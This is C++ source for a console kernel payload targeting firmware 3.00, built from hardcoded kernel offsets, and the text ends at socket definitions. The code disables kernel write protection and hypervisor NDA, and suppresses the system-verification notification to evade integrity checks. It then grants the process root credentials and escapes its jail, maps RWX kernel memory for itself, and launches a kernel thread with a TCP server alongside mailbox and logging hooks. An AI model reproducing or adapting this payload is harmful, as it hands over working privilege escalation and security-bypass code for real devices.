/*
we can beautify the build later...
g++ -Wall -Wno-unused-function -Werror -pie -Os -g -masm=intel -march=znver2
-fcf-protection=none -fno-exceptions -fno-rtti -nostdlib -ffreestanding -static
-ffunction-sections -Wl,--gc-sections -Wl,--build-id=none -o kpayload.elf
kpayload.cpp -T kpayload.ld && objcopy -O binary kpayload.elf kpayload
*/
#include <atomic>
#include <cstddef>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <mutex>
#include <utility>

using s8 = int8_t;
using s16 = int16_t;
using s32 = int32_t;
using s64 = int64_t;
using u8 = uint8_t;
using u16 = uint16_t;
using u32 = uint32_t;
using u64 = uint64_t;
using vu8 = volatile u8;
using vu16 = volatile u16;
using vu32 = volatile u32;
using vu64 = volatile u64;

constexpr size_t PAGE_SIZE = 0x4000;

template <typename T>
constexpr T align_down(T val, size_t align) {
  return val & ~(align - 1);
}

template <typename T>
constexpr T align_up(T val, size_t align) {
  return align_down(val + align - 1, align);
}

#define _Nonnull

#define PACKED __attribute__((packed))

#define ASSERT_STRUCT_SIZE(name, size) \
  static_assert(sizeof(name) == (size), "size of " #name " != " #size)
#define ASSERT_STRUCT_OFFSET(name, field, offset)  \
  static_assert(offsetof(name, field) == (offset), \
                "offset of " #name "." #field " != " #offset)

#define CAT_(x, y) x##y
#define CAT(x, y) CAT_(x, y)

#define OSTRUCT_PAD(size) u8 CAT(_pad_, __COUNTER__)[size]
#define OSTRUCT_S(name) \
  struct name {         \
    union {
#define OSTRUCT_E(name, size) \
  OSTRUCT_PAD(size);          \
  }                           \
  ;                           \
  }                           \
  ;                           \
  ASSERT_STRUCT_SIZE(name, size)
#define OSTRUCT_F(offset, field) \
  struct {                       \
    OSTRUCT_PAD(offset);         \
    field;                       \
  }

using sbintime_t = s64;

using boolean_t = int;
using vm_ooffset_t = s64;
using vm_offset_t = u64;
using vm_size_t = u64;
using vm_paddr_t = u64;
using u_long = u64;
using vm_memattr_t = char;

using uid_t = u32;
using gid_t = u32;
using lwpid_t = s32;
using cpuset_t = u64;

#define VM_PROT_CPU_R 0x0001
#define VM_PROT_CPU_W 0x0002
#define VM_PROT_CPU_X 0x0004
#define VM_PROT_GPU_CACHE_UNK1 0x0010
#define VM_PROT_GPU_CACHE_UNK2 0x0020
#define VM_PROT_GPU_R 0x0040
#define VM_PROT_GPU_W 0x0080
#define VM_PROT_GPU2_R 0x0100
#define VM_PROT_GPU2_W 0x0200

#define VM_PROT_CPU_RX (VM_PROT_CPU_R | VM_PROT_CPU_X)
#define VM_PROT_CPU_RWX (VM_PROT_CPU_R | VM_PROT_CPU_W | VM_PROT_CPU_X)

struct lock_object {
  const char* lo_name;
  u32 lo_flags;
  u32 lo_data;
  struct witness* lo_witness;
};

struct mtx {
  struct lock_object lock_object;
  volatile uintptr_t mtx_lock;
};
ASSERT_STRUCT_SIZE(mtx, 0x20);

template <typename T>
struct ListEntry {
  T* next;
  T** prev;
};

template <typename T>
struct TailQueueEntry {
  T* next;
  T** prev;
};

template <typename T>
struct TailQueueHead {
  T* first;
  T** last;
  bool empty() const { return first == nullptr; }
  void remove(T* entry, TailQueueEntry<T> T::*field) {
    auto& e = entry->*field;
    if (e.next) {
      (e.next->*field).prev = e.prev;
    } else {
      last = e.prev;
    }
    *e.prev = e.next;
  }
};

OSTRUCT_S(malloc_type_internal)
OSTRUCT_E(malloc_type_internal, 0x40);

OSTRUCT_S(malloc_type)
OSTRUCT_F(8 * 3, void* ks_handle);
OSTRUCT_E(malloc_type, 8 * 4);

OSTRUCT_S(pmap)
OSTRUCT_F(0x20, u64* pm_pml4);
OSTRUCT_F(0x28, u64 pm_cr3);
OSTRUCT_E(pmap, 0x288);
using pmap_t = pmap*;

OSTRUCT_S(vm_object)
OSTRUCT_E(vm_object, 0x1b8);
using vm_object_t = vm_object*;

OSTRUCT_S(vm_map_entry)
OSTRUCT_E(vm_map_entry, 0x168);
using vm_map_entry_t = vm_map_entry*;

OSTRUCT_S(vm_map)
OSTRUCT_E(vm_map, 0x298);
using vm_map_t = vm_map*;

OSTRUCT_S(vmspace)
OSTRUCT_F(0, struct vm_map vm_map);
OSTRUCT_F(0x2e0, struct pmap vm_pmap);
OSTRUCT_E(vmspace, 0x568);

OSTRUCT_S(cpuset)
OSTRUCT_F(0, cpuset_t cs_mask);
OSTRUCT_E(cpuset, 0x48);

OSTRUCT_S(sce_ucred)
OSTRUCT_F(0x00, u64 field_0);
OSTRUCT_F(0x08, u64 field_8);
OSTRUCT_E(sce_ucred, 0x90);

OSTRUCT_S(ucred)
OSTRUCT_F(0x04, uid_t cr_uid);
OSTRUCT_F(0x08, uid_t cr_ruid);
OSTRUCT_F(0x0c, uid_t cr_svuid);
OSTRUCT_F(0x10, int cr_ngroups);
OSTRUCT_F(0x14, gid_t cr_rgid);
OSTRUCT_F(0x18, gid_t cr_svgid);
OSTRUCT_F(0x58, sce_ucred sce);
OSTRUCT_F(0x118, gid_t* cr_groups);
OSTRUCT_F(0x120, int cr_agroups);
OSTRUCT_F(0x128, gid_t cr_smallgroups[16]);
OSTRUCT_E(ucred, 0x168);

OSTRUCT_S(filedesc)
OSTRUCT_F(0x10, struct vnode* fd_rdir);
OSTRUCT_F(0x18, struct vnode* fd_jdir);
OSTRUCT_E(filedesc, 0x78);

OSTRUCT_S(proc)
OSTRUCT_F(0, ListEntry<proc> p_list);
OSTRUCT_F(0x40, ucred* p_ucred);
OSTRUCT_F(0x48, filedesc* p_fd);
OSTRUCT_F(0xbc, u32 p_pid);
OSTRUCT_F(0x200, vmspace* p_vmspace);
OSTRUCT_F(0x590, u32 sdk_ver_ppr);
OSTRUCT_F(0xc39, u8 is_ppr);
OSTRUCT_F(0xc84, u32 sdk_ver_ppr_minor);
OSTRUCT_E(proc, 0xC88);

OSTRUCT_S(thread)
OSTRUCT_F(8, proc* td_proc);
OSTRUCT_F(0x60, cpuset* td_cpuset);
OSTRUCT_F(0x9c, u32 td_tid);
OSTRUCT_F(0x13c, int td_pinned);
OSTRUCT_F(0x140, ucred* td_ucred);
OSTRUCT_E(thread, 0x670);

OSTRUCT_S(nameidata)
OSTRUCT_F(0x60, struct vnode* ni_vp);
OSTRUCT_E(nameidata, 0xc8);

enum uio_rw { UIO_READ, UIO_WRITE };

enum uio_seg {
  UIO_USERSPACE, /* from user data space */
  UIO_SYSSPACE,  /* from system space */
  UIO_NOCOPY     /* don't copy, already in object */
};

struct iovec {
  void* iov_base; /* Base address. */
  size_t iov_len; /* Length. */
};

struct uio {
  struct iovec* uio_iov;   /* scatter/gather list */
  int uio_iovcnt;          /* length of scatter/gather list */
  off_t uio_offset;        /* offset in target object */
  ssize_t uio_resid;       /* remaining bytes to process */
  enum uio_seg uio_segflg; /* address space */
  enum uio_rw uio_rw;      /* operation */
  struct thread* uio_td;   /* owner */
};

// sony extended
using vm_prot_t = u16;

using pa_t = u64;

struct PACKED SblMsgHeader {
  u32 cmd;
  u16 send_len;
  u16 resp_len;
  u64 mid;
  union {
    u32 subcmd;
    s32 status;
    // for e.g. mail
    u64 handle;
  };
};
ASSERT_STRUCT_SIZE(SblMsgHeader, 0x18);

struct SvcMailHeader {
  u16 func_id;
  u16 _pad_2;
  s32 status;
};

enum KmsFuncId {
  kCcpAes = 1,
  kCcpXts = 2,
  kCcpSha = 3,
  kCcpRsa = 4,
  kCcpInflate = 5,
  kSetKeyId = 0x101,
  kClearKeyId = 0x102,
  kSetKeyHandle = 0x103,
  kClearKeyHandle = 0x105,
  kTransferHandleToId = 0x106,
  kKmsFunc401 = 0x401,  // envelope
  kKdf = 0x501,         // sceSblKdfIoctl
  kKmsFunc601 = 0x601,  // encdec get_keys
  kKmsFunc701 = 0x701,  // sceSblAppSwapSetRandKey
};

struct KmsMail {
  union KeyPtr {
    // Depending on |flags|, a key may be pa of actual buffer, or a 16 or 32-bit
    // key
    u16 key_id;
    u32 key_id32;
    pa_t ptr;
  };
  struct CcpAes {
    u8 flags;
    // ps4 only had 6 valid modes: ecb, cbc, ofc, cfb, ctr, cmac
    u8 mode;
    u8 is_encrypt;
    // effective len = 16 + key_len * 8
    u8 key_len;
    u32 buf_len;
    u64 _pad_10;
    // apparently |dst| and |src| must be 16 byte aligned
    pa_t dst;
    pa_t src;
    KeyPtr key;
    pa_t iv;
  };

  struct CcpXts {
    u8 flags;
    // effective len = 0x10 << sector_size
    u8 sector_size;
    u8 is_encrypt;
    // effective len = 0x10 << key_len
    u8 key_len;
    u32 num_sectors;
    u64 _pad_10;
    pa_t dst;
    pa_t src;
    // ptr to start value of the tweak (presumably written-back?)
    pa_t sector;
    KeyPtr key;
  };

  struct ClearKeyHandle {
    u32 handle;
  };

  SvcMailHeader hdr;
  union {
    CcpAes aes;
    CcpXts xts;
    ClearKeyHandle clear_key_handle;
    u8 _pad[0x80 - sizeof(hdr)];
  };
};

static inline thread* curthread() {
  thread* td;
  // pcpu.pc_curthread
  asm volatile("mov %0, qword ptr gs:0" : "=r"(td));
  return td;
}

static inline u32 cur_cpuid() {
  u32 cpuid;
  // pcpu.pc_cpuid
  asm volatile("mov %0, dword ptr gs:0x34" : "=r"(cpuid));
  return cpuid;
}

static const u64 CR0_WP = 1 << 16;

static inline u64 cr0_read() {
  u64 reg;
  asm volatile("mov %0, cr0" : "=r"(reg));
  return reg;
}

static inline void cr0_write(u64 val) {
  asm volatile("mov cr0, %0" ::"r"(val));
}

static inline u64 write_protect_disable() {
  u64 cr0 = cr0_read();
  cr0_write(cr0 & ~CR0_WP);
  return cr0;
}

static inline void write_protect_restore(u64 cr0) {
  // Use only WP bit of input
  cr0_write(cr0_read() | (cr0 & CR0_WP));
}

static inline void wbinvd() {
  asm("wbinvd");
}

static inline void crash() {
  asm("ud2");
}

static inline u64 read_rflags() {
  u64 rf;
  asm volatile(
      "pushfq\n"
      "popq %0"
      : "=r"(rf));
  return rf;
}

static inline void write_rflags(u64 rf) {
  asm volatile(
      "pushq %0\n"
      "popfq"
      :
      : "r"(rf));
}

static inline void enable_intr() {
  asm("sti");
}

static inline void disable_intr() {
  asm("cli");
}

static inline u64 intr_disable() {
  u64 rflags = read_rflags();
  disable_intr();
  return rflags;
}

static inline void intr_restore(u64 rflags) {
  write_rflags(rflags);
}

static inline void sched_pin() {
  curthread()->td_pinned++;
  std::atomic_signal_fence(std::memory_order::memory_order_seq_cst);
}

static inline void sched_unpin() {
  std::atomic_signal_fence(std::memory_order::memory_order_seq_cst);
  curthread()->td_pinned--;
}

static inline void msr_write(u32 msr, u64 val) {
  u32 hi = val >> 32;
  u32 lo = val;
  asm volatile("wrmsr" : : "c"(msr), "d"(hi), "a"(lo));
}

static inline u64 msr_read(u32 msr) {
  u32 hi, lo;
  asm volatile("rdmsr" : "=d"(hi), "=a"(lo) : "c"(msr));
  return ((u64)hi << 32) | lo;
}

static const u32 MSR_EFER = 0xC0000080;
static const u64 EFER_NDA = 1 << 16;

static inline void nda_disable() {
  msr_write(MSR_EFER, msr_read(MSR_EFER) & ~EFER_NDA);
}

static inline bool nda_enabled() {
  return (msr_read(MSR_EFER) & EFER_NDA) != 0;
}

size_t strlen(const char* start) {
  const char* end = start;
  while (*end++ != 0)
    ;
  return end - start - 1;
}

struct ShitLock {
  enum LockFlag : u32 { kFree, kUsed };
  void lock() {
    LockFlag expected{kFree};
    LockFlag new_val{kUsed};
    while (!__atomic_compare_exchange(&flag, &expected, &new_val, false,
                                      __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST)) {
      expected = kFree;
    }
  }
  void unlock() {
    LockFlag new_val{kFree};
    __atomic_store(&flag, &new_val, __ATOMIC_SEQ_CST);
  }
  LockFlag flag{kFree};
};

#define RELOC(func, rva) .func = decltype(Syms::func)(rva)
#define RELOC_DEREF(r) r = *(decltype(r)*)r;

struct Syms {
  bool reloc(uintptr_t base) {
    if (initialized) {
      return true;
    }
    kernel_base = base;
    auto start = (uintptr_t*)&copyin;
    auto end = (uintptr_t*)&initialized;
    for (auto p = start; p < end; p++) {
      if (!*p) {
        return false;
      }
      *p += kernel_base;
    }
    RELOC_DEREF(kernel_arena);
    RELOC_DEREF(kmem_arena);
    initialized = true;
    return true;
  }

  int (*copyin)(const void* __restrict udaddr,
                void* _Nonnull __restrict kaddr,
                size_t len);
  int (*copyout)(const void* _Nonnull __restrict kaddr,
                 void* __restrict udaddr,
                 size_t len);

  vm_offset_t (*kmem_alloc_contig)(struct vmem* vmem,
                                   vm_size_t size,
                                   int flags,
                                   vm_paddr_t low,
                                   vm_paddr_t high,
                                   u_long alignment,
                                   vm_paddr_t boundary,
                                   vm_memattr_t memattr);
  vm_offset_t (*kmem_malloc)(struct vmem*, vm_size_t size, int flags);
  void (*kmem_free)(struct vmem* vmem, vm_offset_t addr, vm_size_t size);

  vm_paddr_t (*pmap_kextract)(vm_offset_t va);
  void (*pmap_protect)(pmap_t pmap,
                       vm_offset_t sva,
                       vm_offset_t eva,
                       vm_prot_t prot);

  int (*kthread_add)(void (*func)(void*),
                     void* arg,
                     struct proc* p,
                     struct thread** newtdp,
                     int flags,
                     int pages,
                     const char* fmt,
                     ...);
  void (*kthread_exit)(void);

  int (*soaccept)(struct socket* so, struct sockaddr** nam);
  int (*sobind)(struct socket* so, struct sockaddr* nam, struct thread* td);
  int (*soclose)(struct socket* so);
  int (*socreate)(int dom,
                  struct socket** aso,
                  int type,
                  int proto,
                  struct ucred* cred,
                  struct thread* td);
  int (*solisten)(struct socket* so, int backlog, struct thread* td);
  int (*soreceive)(struct socket* so,
                   struct sockaddr** paddr,
                   struct uio* uio,
                   struct mbuf** mp0,
                   struct mbuf** controlp,
                   int* flagsp);
  int (*sosend)(struct socket* so,
                struct sockaddr* addr,
                struct uio* uio,
                struct mbuf* top,
                struct mbuf* control,
                int flags,
                struct thread* td);
  int (*sosetopt)(struct socket* so, struct sockopt* sopt);

  void (*putchar)(int c, void* arg);
  void (*msgbuf_addstr)(struct msgbuf* mbp, int pri, char* str, int filter_cr);
  int (*printf)(const char*, ...);

  void (*smp_rendezvous)(void (*setup_func)(void*),
                         void (*action_func)(void*),
                         void (*teardown_func)(void*),
                         void* arg);

  int (*_sleep)(void* ident,
                struct lock_object* lock,
                int priority,
                const char* wmesg,
                sbintime_t sbt,
                sbintime_t pr,
                int flags);

  void (*__mtx_lock_flags)(volatile uintptr_t* c,
                           int opts,
                           const char* file,
                           int line);
  void (*__mtx_unlock_flags)(volatile uintptr_t* c,
                             int opts,
                             const char* file,
                             int line);

  void* (*_malloc)(unsigned long size, struct malloc_type* mtp, int flags);
  void (*_free)(void* addr, struct malloc_type* mtp);

  int (*sblServiceRequest)(void* hdr, void* req, void* resp, int poll);
  int (*ioMsgHandler)(u32 index, SblMsgHeader* msg, void* arg);
  int (*handleDefault)(u32 index, SblMsgHeader* msg, void* arg);

  void (*NDINIT_ALL)(struct nameidata* ndp,
                     u_long op,
                     u_long flags,
                     enum uio_seg segflg,
                     const char* namep,
                     int dirfd,
                     struct vnode* startdir,
                     void /*cap_rights_t*/* rightsp,
                     struct thread* td);
  void (*NDFREE)(struct nameidata* ndp, const u32 flags);

  int (*vn_open)(struct nameidata* ndp, int* flagp, int cmode, struct file* fp);
  int (*vn_close)(struct vnode* vp,
                  int flags,
                  struct ucred* file_cred,
                  struct thread* td);
  int (*vn_rdwr)(enum uio_rw rw,
                 struct vnode* vp,
                 void* base,
                 int len,
                 off_t offset,
                 enum uio_seg segflg,
                 int ioflg,
                 struct ucred* active_cred,
                 struct ucred* file_cred,
                 ssize_t* aresid,
                 struct thread* td);

  vmem* kernel_arena;
  vmem* kmem_arena;
  u8* ktext_slack;
  u8* bootparams;
  pmap_t kernel_pmap;
  u8* mdbg_trap_early;
  u8* sysveri_notif_sent;
  struct mtx* accept_mtx;
  u32* dmap_indices;

  // non-reloc'd stuff
  bool initialized;

  void mtx_lock(struct mtx* m) {
    __mtx_lock_flags(&m->mtx_lock, 0, nullptr, 0);
  }
  void mtx_unlock(struct mtx* m) {
    __mtx_unlock_flags(&m->mtx_lock, 0, nullptr, 0);
  }

  void malloc_type_init() { fake_mt.ks_handle = &fake_mti; }
  void* malloc(size_t len) {
    malloc_type_init();
    return _malloc(len, &fake_mt, 0x102);
  }
  void free(void* addr) {
    malloc_type_init();
    _free(addr, &fake_mt);
  }

  template <typename T>
  T* pa_to_dmap(uintptr_t pa) {
    auto pml4ei = (uintptr_t)dmap_indices[0];
    auto pdpei = (uintptr_t)dmap_indices[1];
    return (T*)(0xFFFF800000000000ull | (pml4ei << 39) | (pdpei << 30) | pa);
  }

  vu64 debug;
  u64 sdk_ver_ppr;
  uintptr_t kernel_base;
  malloc_type_internal fake_mti;
  malloc_type fake_mt;
  u32 host_ip_addr;
  ShitLock uart_lock;
};
static Syms sym_3_00 = {
    RELOC(copyin, 0x25ffb0),
    RELOC(copyout, 0x25ff00),
    RELOC(kmem_alloc_contig, 0x4d5b20),
    RELOC(kmem_malloc, 0x4d5f60),
    RELOC(kmem_free, 0x4d61e0),
    RELOC(pmap_kextract, 0x831410),
    RELOC(pmap_protect, 0x834600),
    RELOC(kthread_add, 0x879c00),
    RELOC(kthread_exit, 0x879ed0),
    RELOC(soaccept, 0x4dacf0),
    RELOC(sobind, 0x4da5b0),
    RELOC(soclose, 0x4da750),
    RELOC(socreate, 0x4d9490),
    RELOC(solisten, 0x4da6a0),
    RELOC(soreceive, 0x4dda00),
    RELOC(sosend, 0x4dbc00),
    RELOC(sosetopt, 0x4ddd70),
    RELOC(putchar, 0x48b490),
    RELOC(msgbuf_addstr, 0xb4c970),
    RELOC(printf, 0x48b9a0),
    RELOC(smp_rendezvous, 0xa3e850),
    RELOC(_sleep, 0xb234c0),
    RELOC(__mtx_lock_flags, 0x49f450),
    RELOC(__mtx_unlock_flags, 0x49f950),
    RELOC(_malloc, 0xb25d60),
    RELOC(_free, 0xb25f70),
    RELOC(sblServiceRequest, 0x71c6b0),
    RELOC(ioMsgHandler, 0x501fe0),
    RELOC(handleDefault, 0x71cd00),
    RELOC(NDINIT_ALL, 0x59c9a0),
    RELOC(NDFREE, 0x59ca20),
    RELOC(vn_open, 0x630850),
    RELOC(vn_close, 0x6313e0),
    RELOC(vn_rdwr, 0x631600),
    RELOC(kernel_arena, 0x18a1330),
    RELOC(kmem_arena, 0x18a1338),
    RELOC(ktext_slack, 0xbc61b8),
    RELOC(bootparams, 0x7036440),
    RELOC(kernel_pmap, 0x3d8e218),
    RELOC(mdbg_trap_early, 0x752460),
    RELOC(sysveri_notif_sent, 0x31cec48),
    RELOC(accept_mtx, 0x3328070),
    RELOC(dmap_indices, 0x3d8e4a0),
};
static Syms& sym = sym_3_00;

extern char payload_early_start[];
extern char payload_early_end[];
extern char payload_start[];
extern char payload_end[];

static constexpr size_t get_payload_early_size() {
  return payload_early_end - payload_early_start;
}

static constexpr size_t get_payload_size() {
  return payload_end - payload_start;
}

static constexpr size_t get_early_rva(u8* addr) {
  return (uintptr_t)addr - (uintptr_t)payload_early_start;
}

static constexpr size_t get_rva(u8* addr) {
  return (uintptr_t)addr - (uintptr_t)payload_start;
}

template <typename T>
static constexpr T reloc_early_addr(uintptr_t base, T addr) {
  return (T)(base + get_early_rva((u8*)addr));
}

template <typename T>
static constexpr T reloc_addr(uintptr_t base, T addr) {
  return (T)(base + get_rva((u8*)addr));
}

static void hook_putchar(int c, void* arg);
static void hook_msgbuf_addstr(void* mbp, int pri, char* str, int filter_cr);
static bool hook_install_near(uintptr_t thunk, uintptr_t target);
static void hook_install_far(uintptr_t thunk, uintptr_t target);
static void log_kick(void* msg, size_t len);
static void log(const char* msg) {
  log_kick((void*)msg, strlen(msg));
}

template <typename T>
struct ScopedMalloc {
  ScopedMalloc(size_t len) { ptr = (T*)sym.malloc(len); }
  ~ScopedMalloc() {
    sym.free(ptr);
    ptr = nullptr;
  }
  operator bool() { return ptr != nullptr; }
  T* get() { return ptr; }
  T* ptr;
};

struct SchedPin {
  SchedPin() { sched_pin(); }
  ~SchedPin() { sched_unpin(); }
};

using smp_rendezvous_action_t = void (*)(void*);
static void smp_rendezvous(smp_rendezvous_action_t action, void* arg) {
  sym.smp_rendezvous(nullptr, action, nullptr, arg);
}

struct nda_disable_stats {
  std::atomic<u32> tried;
  std::atomic<u32> failed;
};

// this is an individual function so it can be executed from kernel slack easily
static void nda_disable_worker(void* arg) {
  nda_disable();
  auto stats_local = (nda_disable_stats*)arg;
  stats_local->tried++;
  stats_local->failed += nda_enabled();
}

template <typename T>
static void modify_code(T callback) {
  SchedPin pin;
  auto wp = write_protect_disable();
  callback();
  wbinvd();
  write_protect_restore(wp);
}

static bool nda_disable_all() {
  // Run nda_disable on all cores until NDA is actually disabled on all cores.
  // It normally needs to run twice, since the first loop may be the first time
  // some cores enter the vmm after vmcb was modified.
  // TODO avoid executing from ktext_slack (find some existing gadget that will
  // enter vmm)
  modify_code([] {
    memcpy((void*)sym.ktext_slack, payload_early_start,
           get_payload_early_size());
  });

  auto nda_disabler =
      reloc_early_addr((uintptr_t)sym.ktext_slack, nda_disable_worker);

  bool done = false;
  for (u32 i = 0; i < 10 && !done; i++) {
    nda_disable_stats stats{};
    smp_rendezvous(nda_disabler, &stats);

    /*
    sym.printf("nda disable on %d cores: %d failed\n", stats.tried.load(),
               stats.failed.load());
    //*/
    if (stats.failed.load() == 0) {
      done = true;
      break;
    }
  }

  modify_code(
      [] { memset((void*)sym.ktext_slack, 0x90, get_payload_early_size()); });
  return done;
}

static void enable_verbose_output() {
  modify_code([] {
    // enables more printf-output, but prevents console from entering rest mode
    // (shuts down instead of booting eap)
    sym.bootparams[0x128] = 1;  // is_manu_mode

    sym.bootparams[0x12a] = 0;  // consmute_char

    // enable system level dbg
    sym.bootparams[0x34] |= 4;
    sym.bootparams[0x59] |= 2;

    // settting as devkit will crash because kernel will start calling
    // ktrace/debug code, some of which is located on the first kernel pages,
    // which have been replaced with all-cc
    //*sym.sce_kernel_type = 4;

    // show more context when fatal trap is taken
    *sym.mdbg_trap_early = 0xc3;
  });
}

static bool tcp_server();

static int hook_sbl_io_handler(u32 index, SblMsgHeader* msg, void* arg) {
  bool is_io = msg->cmd == 4;
  sym.printf("[psp > x86] %24D | %128D\n", msg, "", msg + 1, "");
  if (is_io) {
    return sym.ioMsgHandler(index, msg, arg);
  } else {
    return sym.handleDefault(index, msg, arg);
  }
}

static int hook_sceSblServiceMailbox(u64 handle, void* send, void* resp) {
  SblMsgHeader hdr{
      .cmd = 6,
      .send_len = 0x80,
      .resp_len = 0x80,
      .handle = handle,
  };
  sym.printf("[x86 > psp] %24D | %128D\n", &hdr, "", send, "");
  return sym.sblServiceRequest(&hdr, send, resp, 0);
}

static void install_sbl_hooks() {
  auto ioMsgHandler_ptr = (uintptr_t*)(sym.kernel_base + 0x4231618);
  auto handleDefault_ptr = (uintptr_t*)(sym.kernel_base + 0x4231660);
  modify_code([&] {
    *ioMsgHandler_ptr = (uintptr_t)hook_sbl_io_handler;
    *handleDefault_ptr = (uintptr_t)hook_sbl_io_handler;
  });
  uintptr_t sceSblServiceMailbox = sym.kernel_base + 0x534220;
  hook_install_far(sceSblServiceMailbox, (uintptr_t)hook_sceSblServiceMailbox);
}

// TODO this seems to cause
//  [KERNEL] WARNING: kmap PDPE leak.
//  ...
//  [KERNEL] INFO: budget_appid_clear(16, 0)=3
// when e.g. closing an app. Do we need to care?
static void setup_full_dmap(int enable) {
  auto pml4 = curthread()->td_proc->p_vmspace->vm_pmap.pm_pml4;
  uintptr_t base = 0xffffffe000000000;

  auto pml4e = pml4[(base >> 39) & 0x1ff];

  auto pdp = sym.pa_to_dmap<u64>(pml4e & 0x000ffffffffff000);
  auto pdpe = &pdp[(base >> 30) & 0x1ff];

  for (u32 i = 0; i < 16 + 2; i++) {
    pdpe[i] = enable ? ((0x40000000ull * i) | 0x9f) : 0;
  }
}

struct DmapPin {
  DmapPin() { setup_full_dmap(1); }
  ~DmapPin() { setup_full_dmap(0); }
};

static void thread_entry(void*) {
  enable_verbose_output();

  hook_install_far((uintptr_t)sym.msgbuf_addstr, (uintptr_t)hook_msgbuf_addstr);
  // by default putchar is just a subset of what can be seen with msgbuf
  // hook_install_far((uintptr_t)sym.putchar, (uintptr_t)hook_putchar);

  // setup_full_dmap();

  // install_sbl_hooks();

  sym.printf("%s %lx %lx\n", "thread entry", (uintptr_t)thread_entry,
             sym.kernel_base);

  // check we're mapped writable (not currently required, just for sanity)
  sym.debug = 0xdeadbeef;
  sym.printf("write check: %lx\n", sym.debug);

  tcp_server();

  sym.printf("%s\n", "thread exit");
  sym.kthread_exit();
}

static void pmap_protect(uintptr_t va, size_t len, vm_prot_t prot) {
  vm_offset_t sva = align_down(va, PAGE_SIZE);
  vm_offset_t eva = align_up(va + len, PAGE_SIZE);
  sym.pmap_protect(sym.kernel_pmap, sva, eva, prot);
}

static int host_ip_addr_set(uintptr_t uaddr);

struct kpayload_args {
  uintptr_t kernel_text_base;
  uintptr_t payload_uva;
  uintptr_t host_saddr;
  uintptr_t operation;
};

// see ppr_sdkversion_64
static bool get_fw_version() {
  auto p = curthread()->td_proc->p_list.next;
  while (p) {
    // sym.printf("pid %d %d %08x\n", p->p_pid, p->is_ppr, p->sdk_ver_ppr);
    // assume mini-syscore is representative of actual fw version
    if (p->p_pid == 1 && p->is_ppr) {
      sym.sdk_ver_ppr = (u64)p->sdk_ver_ppr << 32;
      if (p->sdk_ver_ppr_minor != 0xffffffff) {
        sym.sdk_ver_ppr |= p->sdk_ver_ppr_minor;
      }
      return true;
    }
    p = p->p_list.next;
  }
  return false;
}

static void ucred_set_root(ucred* cr) {
  cr->cr_uid = cr->cr_ruid = cr->cr_svuid = 0;
  cr->cr_rgid = cr->cr_svgid = 0;
  cr->cr_ngroups = 1;
  cr->cr_groups[0] = 0;

  cr->sce.field_0 = 0x480000000000001eull;
  cr->sce.field_8 = 0x40001c0000000000ull;

  auto p = curthread()->td_proc->p_list.next;
  while (p) {
    if (p->p_pid == 0) {
      auto fd = curthread()->td_proc->p_fd;
      fd->fd_rdir = p->p_fd->fd_rdir;
      fd->fd_jdir = nullptr;
      break;
    }
    p = p->p_list.next;
  }
}

// called as syscall handler. used as entrypoint / initializer
extern "C" int sys_kpayload(struct thread* td, kpayload_args* args) {
  SchedPin pin;

  if (!get_fw_version()) {
    return 1;
  }

  switch (sym.sdk_ver_ppr >> 48) {
  case 0x3'00:
    sym = sym_3_00;
    break;
  default:
    return 1;
  }

  if (args->operation == 0) {
    return 13370;
  }

  nda_disable();
  if (!sym.reloc(args->kernel_text_base)) {
    return 2;
  }

  if (args->operation == 1) {
    return 13371;
  }

  modify_code([] {
    // prevent sysveri notification from being sent by saying it was already
    // done. PSP will still detect us if we patch stuff, tho.
    // Do it ASAP although it's probably not a huge deal...could also be done
    // preemptively from userspace.
    *sym.sysveri_notif_sent = 1;
  });
  // TODO after fw 3 hv changes, this is no longer reliable. need to find good
  // way to force cores through hv.
  if (!nda_disable_all()) {
    return 1;
  }

  if (args->operation == 2) {
    return 13371;
  }

  ucred_set_root(curthread()->td_ucred);

  int err = host_ip_addr_set(args->host_saddr);
  if (err) {
    return err;
  }

  // alloc va, wire pages. protection hardcoded to RW
  const vm_size_t payload_size = get_payload_size();
  const vm_size_t payload_size_aligned = align_up(payload_size, PAGE_SIZE);
  // TODO malloc with something which doesn't require a vmem*?
  vm_offset_t addr = sym.kmem_malloc(sym.kernel_arena, payload_size_aligned, 1);
  if (!addr) {
    return 12;
  }

  // reprotect as rwx
  // TODO investigate why we must directly use pmap_protect here. it will cause
  // mapping to be desynchronized with vm_map_* layer.
  pmap_protect(addr, payload_size, VM_PROT_CPU_RWX);

  // copy ourselves using the user mapping
  err = sym.copyin((void*)args->payload_uva, (void*)addr, payload_size);
  if (err) {
    return err;
  }
  wbinvd();

  // Start thread on copy of ourself
  auto thread_entry_relocated = reloc_addr(addr, thread_entry);
  sym.printf("kernel %lx reloc %lx thread %lx\n", args->kernel_text_base, addr,
             (uintptr_t)thread_entry_relocated);
  err = sym.kthread_add(thread_entry_relocated, nullptr, nullptr, nullptr, 0, 0,
                        "%s", "haxthread");
  if (err) {
    sym.printf("kthread_add:%d\n", err);
    return err;
  }
  return 0;
}

using in_addr_t = u32;
using sa_family_t = u8;
using in_port_t = u16;

#define AF_INET 2

#define SOCK_STREAM 1
#define SOCK_DGRAM 2

#define MSG_WAITALL 0x40
#define MSG_DONTWAIT 0x80

#define SOL_SOCKET 0xffff

#define SO_REUSEADDR 0x0004
#define SO_KEEPALIVE 0x0008
#define SO_SNDTIMEO 0x1005
#define SO_RCVTIMEO 0x1006

#define IPPROTO_TCP 6

#define TCP_KEEPINIT 128
#define TCP_KEEPIDLE 256
#define TCP_KEEPINTVL 512
#define TCP_KEEPCNT 1024

struct in_addr {
  in_addr_t s_addr;
};

struct sockaddr_in {
  uint8_t sin_len;
  sa_family_t sin_family;
  in_port_t sin_port;
  struct in_addr sin_addr;
  char sin_zero[8];
};

enum sopt_dir { SOPT_GET, SOPT_SET };

struct sockopt {
  enum sopt_dir sopt_dir; /* is this a get or a set? */
  int sopt_level;         /* second arg of [gs]etsockopt */
  int sopt_name;          /* third arg of [gs]etsockopt */
  void* sopt_val;         /* fourth arg of [gs]etsockopt */
  size_t sopt_valsize;    /* (almost) fifth arg of [gs]etsockopt */
  struct thread* sopt_td; /* calling thread or null if kernel */
};

constexpr u16 htons(u16 val) {
  return (val >> 8) | (val << 8);
}

constexpr u32 ipv4_addr_n(u8 a, u8 b, u8 c, u8 d) {
  return (d << 24) | (c << 16) | (b << 8) | a;
}

constexpr u32 INADDR_ANY = ipv4_addr_n(0, 0, 0, 0);
constexpr u32 INADDR_BROADCAST = ipv4_addr_n(255, 255, 255, 255);

